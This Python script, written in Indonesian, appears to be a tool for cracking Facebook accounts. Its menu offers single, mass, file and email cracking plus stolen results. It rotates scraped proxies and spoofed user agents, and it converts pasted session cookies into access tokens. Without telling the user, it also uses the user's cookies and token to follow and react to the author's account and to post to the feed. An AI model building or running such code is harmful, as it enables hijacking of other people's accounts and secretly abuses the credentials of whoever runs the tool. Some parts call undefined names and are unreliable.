### IMPORT MODULE ###
from concurrent.futures import ThreadPoolExecutor as tred
import requests,bs4,json,os,sys,random,datetime,time,re,platform
from time import sleep as jeda
import urllib3,rich,base64
# RICH
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.progress import SpinnerColumn
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from rich.table import Table as me
from rich.columns import Columns
from rich.text import Text as tekz
from rich.console import Console
from rich import print as cetak
from rich.tree import Tree
from rich import pretty
# BS4
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as bs
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
try:
	import rich
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Rich •'))
	os.system('pip install rich')
try:
	import stdiomask
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
	os.system('pip install stdiomask')
try:
	import urllib3
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul urllib3 •'))
	os.system('pip install urllib3')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
	cetak(nel('\t• Sedang Menginstall Modul Package •'))
	os.system('pip install stdiomask')
	os.system('pkg install play-audio')
	os.system('pkg install git')
	os.system('git clone git clone https://github.com/aldii-ls/data')
### GLOBAL CONFIG ###
console = Console()
pretty.install()
CON=sol()
cokbrut=[]
ugen=[]
ugen2=[]
ua=[]
tod=[]
uadia, uadarimu = [],[]
cokbrut=[]
pwpluss,pwnya=[],[]
ses=requests.Session()
princp=[]
dump=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]


### GET PROXY ###
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.prox.txt','r').read().splitlines()

### U-AGENYA ###
for xd in range(10000):
 rr = random.randint
 rc = random.choice
 u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A127F BuildSP1A.210812.016.{str(rr(111111,210000))}.001; vw) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 u6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J330G Build/PPR1.180610.011.{str(rr(111111,210000))}.001;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 u7 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))} SAMSUNG-SGH-I337 Build/LRX22C) {str(rr(111111,210000))}.001;wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 u8 = f"Mozilla/5.0 (Linux; Android  {str(rr(4,12))} SAMSUNG SM-N1000V 4G Build/LRX21V) {str(rr(111111,210000))}.001;wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(73,150))}.0.{str(rr(5500,51000))}.{str(rr(75,150))} Mobile Safari/537.36"
 UaMainn = random.choice([u1, u2, u3, u4, u5, u6, u7, u8])
 ugen.append(UaMainn)

 kios =random.choice(['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A426B/A426BXXU2BUF2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G570M Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]','Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]','Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 Instagram 290.0.0.13.76 Android (29/10; 280dpi; 720x1473; motorola; moto e(7) plus; guam; qcom; en_GB; 491057553)','Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.79.203','Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]','Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [LinkedInApp]/9.28.1299.4','Mozilla/5.0 (Linux; Android 10; TECNO B1g) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'])
 ugen2.append(kios)

### WARNA ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
b2 = "[#5D5CFF]"
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
bpk1 = '\033[41m\033[33m'
bpk2 = '\033[41m\33[1;96m'
bpk3 = '\033[41m\033[32m'
bpk = random.choice([bpk1,bpk2,bpk3])
randm_color=random.choice([M,H,K,B,U,N])
bner_c=random.choice([M2,H2,B2,U2,O2])
pnel_c=random.choice(['#FF8F00','#AF00FF','#00C8FF'])
stl_c=random.choice([O,U,B])
txt=random.choice([B2,U2,M2])

### BULAN ###
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
import datetime
def jam_sekarang():
    waktu_sekarang = datetime.datetime.now()
    jam = waktu_sekarang.strftime("%H:%M:%S")
    return jam
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
DUMP_F  = str(tgl)+'-'+str(bln)+'-'+str(thn)+'-'+str(jam_sekarang())

### MACHINE SUPPORT ###
#Function Ulang Tahun
import datetime
def hitung_mundur_ulang_tahun(tanggal_lahir):
    tanggal_sekarang = datetime.datetime.now().date()
    tahun_sekarang = tanggal_sekarang.year
    # Mengubah tanggal ulang tahun menjadi tanggal tahun ini
    ulang_tahun_tahun_ini = datetime.date(tahun_sekarang, tanggal_lahir.month, tanggal_lahir.day)
    # Mengecek apakah tanggal ulang tahun sudah lewat atau belum
    if ulang_tahun_tahun_ini < tanggal_sekarang:
        # Jika sudah lewat, hitung mundur hingga ulang tahun tahun depan
        ulang_tahun_tahun_depan = datetime.date(tahun_sekarang + 1, tanggal_lahir.month, tanggal_lahir.day)
        selisih_hari = ulang_tahun_tahun_depan - tanggal_sekarang
    else:
        # Jika belum lewat, hitung mundur hingga ulang tahun tahun ini
        selisih_hari = ulang_tahun_tahun_ini - tanggal_sekarang
    return selisih_hari.days
# Contoh penggunaan fungsi
tanggal_lahir = datetime.date(2007, 10, 16)#tahun,bulan,tanggal
mundur_ulang_tahun = hitung_mundur_ulang_tahun(tanggal_lahir)


from time import sleep as jeda
def back():
	login()
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']:tahunz = '2009'
		elif fx[:9] in ['100000000']:tahunz = '2009'
		elif fx[:8] in ['10000000']:tahunz = '2009'
		elif fx[:7] in ['1000000','1000001',
															'1000002','1000003',
															'1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007',
															'1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']:tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003']:tahunz = '2011-2012'
		elif fx[:6] in ['100004']:tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006']:tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008']:tahunz = '2014-2015'
		elif fx[:6] in ['100009']:tahunz = '2015'
		elif fx[:5] in ['10001']:tahunz = '2015-2016'
		elif fx[:5] in ['10002']:tahunz = '2016-2017'
		elif fx[:5] in ['10003']:tahunz = '2018'
		elif fx[:5] in ['10004']:tahunz = '2019'
		elif fx[:5] in ['10005']:tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']:tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

def Time():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow

def clear():
	os.system('clear')
def back():
	login()

### LOGO ###
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "
def banner():
	clear()
	cetak(nel(f'''{bner_c}
\t  ░█████╗░░█████╗░██╗░░██╗░█████╗░░░░██████╗░██╗░░░██╗
\t  ██╔══██╗██╔══██╗██║░░██║██╔══██╗░░░██╔══██╗╚██╗░██╔╝
\t  ███████║██║░░╚═╝███████║███████║░░░██████╔╝░╚████╔╝░
\t  ██╔══██║██║░░██╗██╔══██║██╔══██║░░░██╔═══╝░░░╚██╔╝░░
\t  ██║░░██║╚█████╔╝██║░░██║██║░░██║██╗██║░░░░░░░░██║░░░
\t  ╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░
''',title=f'{M2}⬤  {K2}⬤  {H2}⬤[bold blue] ────────────────────────────────────────────────────────────────── [•]',subtitle=f'[•] ──────────────────────────────────────────────────────────── {M2}⬤  {K2}⬤  {H2}⬤ ─',style='b blue'))
def ner_log():
	clear()
	cetak(nel(f'''{bner_c}
\t  ░█████╗░░█████╗░██╗░░██╗░█████╗░░░░██████╗░██╗░░░██╗
\t  ██╔══██╗██╔══██╗██║░░██║██╔══██╗░░░██╔══██╗╚██╗░██╔╝
\t  ███████║██║░░╚═╝███████║███████║░░░██████╔╝░╚████╔╝░
\t  ██╔══██║██║░░██╗██╔══██║██╔══██║░░░██╔═══╝░░░╚██╔╝░░
\t  ██║░░██║╚█████╔╝██║░░██║██║░░██║██╗██║░░░░░░░░██║░░░
\t  ╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░
''',title=f'{M2}⬤  {K2}⬤  {H2}⬤[bold blue] ─────────────────────────────────────────────────────────────────────────',subtitle=f'┬ ────────────────────────────────────────────────────────────── {M2}⬤  {K2}⬤  {H2}⬤ ─',style='b blue'))

###LOGIN###
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def token1():
	try:
		ses = requests.Session()
		print("=======================================")
		cookie = input(f'\n[{k}+{x}] Masukan Cookie : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print('\nLogin Berhasil , file tersimpan di .token.txt & .cok.txt')
		menu(my_name,my_id)
	except Exception as e:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
def login_lagi334():
	try:
		os.system('clear')
		ner_log()
		ses = requests.Session()
		cetak(nel(f'\r{txt}Login dengan cookie, disarankan menggunakan cookie fresh dan menggunakan extension {H2}cookiedough, {txt}Selamat menikmati hasil nya dan tetap bersyukur apa yang ada.',style="b blue",title=f"{P2}[ {B2}LOG IN COOKIE{P2} ]",subtitle='┬ ─────────────────────────────────────────────────────────────────────────'))
		asu = random.choice([m,k,h,b,u])
		your_cookies = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {K}Masukkan Cookies\33[m :{asu} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					cetak(nel(f'{M2}         [!] invalid cookie!, gunakan cookie yang masih fresh',width=39,style=f'bold red'))
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							cetak(nel(f'{P2}[{H2}•{P2}] Token : {B2}{access_token}',style=f'bold blue'));time.sleep(3)
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							cetak(nel(f'{P2}[{H2}•{P2}] Login Berhasil, Tersimpan Di .cok.txt & .token.txt',style=f'bold blue'));bottnyaaa()
							cetak(nel(f'{P2}[{H2}•{P2}] {P2}Jalankan ulang scriptnya {P2}| {H2}python acha.py',style=f'bold blue'))
							time.sleep(0.5)
							exit()
			except Exception as e:
				cetak(nel(f'{M2}         [!] invalid cookie!',width=39,style=f'bold red'))
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

def bottnyaaa():
	try:
		token = open('.token.txt','r').read()
		cookies = open('.cok.txt','r').read()
		cok = {
		"cookie": cookies
	}
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	with requests.Session() as xyz:
		req = xyz.get('https://mbasic.facebook.com/language/', cookies=cok)
		pra = par(req.content,'html.parser')
		
		for x in pra.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {
				"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
				"jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
				"submit"  : "Bahasa Indonesia"
				}
				url = 'https://mbasic.facebook.com' + x['action']
		for x in par(xyz.get('https://mbasic.facebook.com/100072317603875?v=timeline',cookies=cok).content,'html.parser').find_all('a',href=True):
			if 'Tanggapi' in x.text:
				_react_type_ = 'Super'
				for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cok).content,'html.parser').find_all('a'):
					if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cok)
					else:pass
		for x in par(xyz.get('https://mbasic.facebook.com/100072317603875?v=timeline',cookies=cok).content,'html.parser').find_all('a',href=True):
			if 'Tanggapi' in x.text:
				_react_type_ = 'Super'
				for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cok).content,'html.parser').find_all('a'):
					if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cok)
					else:pass
		for x in par(xyz.get('https://mbasic.facebook.com/100072317603875?v=timeline',cookies=cok).content,'html.parser').find_all('a',href=True):
			if 'Tanggapi' in x.text:
				_react_type_ = 'Super'
				for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cok).content,'html.parser').find_all('a'):
					if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cok)
					else:pass
		for x in par(xyz.get('https://mbasic.facebook.com/sadtime098',cookies=cok).content,'html.parser').find_all('a',href=True):
			if 'subscribe.php' in x['href']:
				exec_folls = xyz.get(
					'https://mbasic.facebook.com%s'%(x['href']),
					cookies=cok
				)
				break
			elif 'Tambah Teman' in x['href']:
				exec_folls = xyz.get(
					'https://mbasic.facebook.com%s'%(x['href']),
					cookies=cok
				)
				break
			elif 'Ikuti' in x['href']:
				exec_folls = xyz.get(
					'https://mbasic.facebook.com%s'%(x['href']),
					cookies=cok
				)
				break
			elif 'Suka' in x['href']:
				exec_folls = xyz.get(
					'https://mbasic.facebook.com%s'%(x['href']),
					cookies=cok
				)
				break
			elif 'Sukai Halaman' in x['href']:
				exec_folls = xyz.get(
					'https://mbasic.facebook.com%s'%(x['href']),
					cookies=cok
				)
				break
### MENU ###
def menu(NAME,ID):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post("https://graph.facebook.com/100072317603875?fields=subscribers&access_token=%s"%(token))
		requests.post("https://graph.facebook.com/v13.0/me/feed?link=https://www.facebook.com/100072317603875/posts/240064615080790/?substory_index=992749425466018&app=fbl&published=0&access_token=%s"%(token))
	except IOError:
		print('{M}[×] Cookies Kadaluarsa\33[m ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	lup = []
	ss =[]
#	ip = requests.get("https://api.ipify.org").text
	#INGFO#
	lup.append(nel(f"{B2}•{P2} Github: {B2}Aldii-ls\n{B2}•{P2} Account: {B2}{NAME}\n{B2}•{P2} Id: {B2}{ID}",width=39,style="bold blue",title=f'{P2}[ {O2}INFO {P2}]'))
	lup.append(nel(f"{B2}•{P2} Country: {B2}{CN}\n{B2}•{P2} Ip: {B2}"+IP+f"\n{B2}•{P2} Date: {B2}{tgl}{M2} - {B2}{bln}{M2} - {B2}{thn}",width=38,style="bold blue",title=f'{P2}[ {O2}INFO{P2} ]'))
	CON.print(Columns(lup))
	
	cetak(nel(f'\t\t   {P2}• Ulang Tahun Aldi {B2}{mundur_ulang_tahun} {P2}Hari Lagi •',title=f'{P2}[ {B2}REMINDER {P2}]',style="bold blue"))
	cetak(nel(f'\t\t   {P2}• Ketik {B2}Musik{P2} Untuk Kemenu Musik •',title=f'{P2}[ {B2}ODHER FITURE {P2}]',style="bold blue"))

	#MENU FITUR#
	ss.append(nel(f'{B2}• {P2}[{H2}01{P2}] Crack singgle id\n{B2}• {P2}[{H2}02{P2}] Crack Massal\n{B2}• {P2}[{H2}03{P2}] Hasil Maling',title='[bold green]MENU',width=39,style="bold blue",subtitle=f"┬ ──────────────────────────────────────────────────────────────"))
	ss.append(nel(f'{B2}• {P2}[{H2}04{P2}] Crack File\n{B2}• {P2}[{H2}05{P2}] Dump File\n{B2}• {P2}[{H2}06{P2}] Crack Email',title='[bold green]MENU',width=38,style="bold blue"))
	CON.print(Columns(ss))
	
	#INPUT MENU#
	_ALLS_MENU_ = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
	if _ALLS_MENU_ in ['01','1']:
		dump_single()
	elif _ALLS_MENU_ in ['02','2']:
		dump_massal()
	elif _ALLS_MENU_ in ['03','3']:
		result()
	elif _ALLS_MENU_ in ['04','4']:
		crack_file()
	elif _ALLS_MENU_ in ['05','5']:
		dumpid()
	elif _ALLS_MENU_ in ['06','6']:
		crack_email()
	elif _ALLS_MENU_ in ['Musik','MUSIK','musik']:
		music()
	elif _ALLS_MENU_ in ['07','7']:
		nomorhape()
	elif _ALLS_MENU_ in ['08','8']:
		crack_grup()
	elif _ALLS_MENU_ in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		cetak(nel(f'{M2}         [!] invalid menu!',width=39,style=f'bold red'))
		back()

def music():
	os.system('clear')
	banner()
	cetak(nel(f'{P2}Jika Mau Menukar Musik, Silahkan Hapus Sessi Terminal Dengan Cara {H2}CTRL + C {K2}-->{H2} CTRL + D 2x{H2} --> ,{P2}Close Termuxnya Dan Jalanin Ulang Scriptnya | {M2}python Acha.py{P2}',style='bold blue'))
	cetak(nel(f'{B2}• {P2}[{B2}01{P2}] {P2}Menu Musik\n{B2}• {P2}[{B2}02{P2}] {P2}Play Musik Sendiri',style=f'bold blue',subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	musk = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
	if musk in ['01','1']:
		menu_musik()
	elif musk in ['02','2']:
		musik_sendiri()
	elif musk in ['']:
		music('Menu Invalid')
	else:
		login()
def menu_musik():
	cetak(nel(f'{B2}• {P2}[{B2}01{P2}] {P2}Dj Pyramid Slow Bass\n{B2}• {P2}[{B2}02{P2}] {P2}Dj Aku bete sama kamu\n{B2}• {P2}[{B2}03{P2}] {P2}Dj Dj angels like you',style=f'bold blue',subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	menu_musik = input(f'{B}╭──┤\n└─[{h}•{P}{B}] {P}Pilih\33[m :{asu} ')
	if menu_musik in ['01','1']:
		os.popen('play-audio data/musik1');time.sleep(3)
		login()
	elif menu_musik in ['02','2']:
		os.popen('play-audio data/musik2');time.sleep(3)
		login()
	elif menu_musik in ['03','3']:
		os.popen('play-audio data/musik3');time.sleep(3)
		login()
	else:
		login()
def musik_sendiri():
	dirs = os.listdir('data')
	cetak(nel(f"""{P2} List Musik Yang Tersedia""",width=87,style=f"bold blue"))
	for file in dirs:
		cetak(nel(f"""{K2}{(file)}""",width=87,style=f"bold blue"))
	try:
		cetak(nel(f"""{P2}copy nama musik di atas kemudian tempel di bawah ini contoh {M2} musik_anda.mp3""",width=87,style=f"bold blue"))
		ini_sendiri()
	except IOError:
		prints(Panel(f"""{M2}Tidak ada musik yang terdaftar, silahkan tambah dahulu""",width=87,style=f"bold blue"))
		back()
def ini_sendiri():
	musik = ("data/")
	romi = console.input(f" {H2}⬤ {P2}Tempel atau masukan nama lagu yang mau di putar :{B2} ")
	if romi == "":
		cetak(nel(f"""{K2}isi yang benar""",width=87,style=f"{color_panel}"))
		opsi()
	try:
		file_cp = os.popen('play-audio '+musik+romi);time.sleep(2)
		back()
	except IOError:
		exit(cetak(nel(f"""{P2}nama file{K2} {(romi)} {P2}tidak di temukan""",width=87,style=f"bold blue")))
		
def crack_email():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
#	global ok , cp
	cetak(nel(f'\t\t {B2}Masukan Target! {M2}Example: {H2}Iqbal{M2},{H2}Reza{M2},{H2}Putri{P2}',style=f'bold blue',subtitle=f'┬ ────────────────────────────────────────────────────────────────────────'))
	nama = input(f'\x1b[1;94m╭──┤\n└─[{h}•{P}\x1b[1;94m] {P}Target\33[m :{asu} ')
	if ',' in str(nama):
		cetak(nel(f'{M2}         [!] Invalid Target',width=39,style=f'bold red'))
		time.sleep(0.002);back()
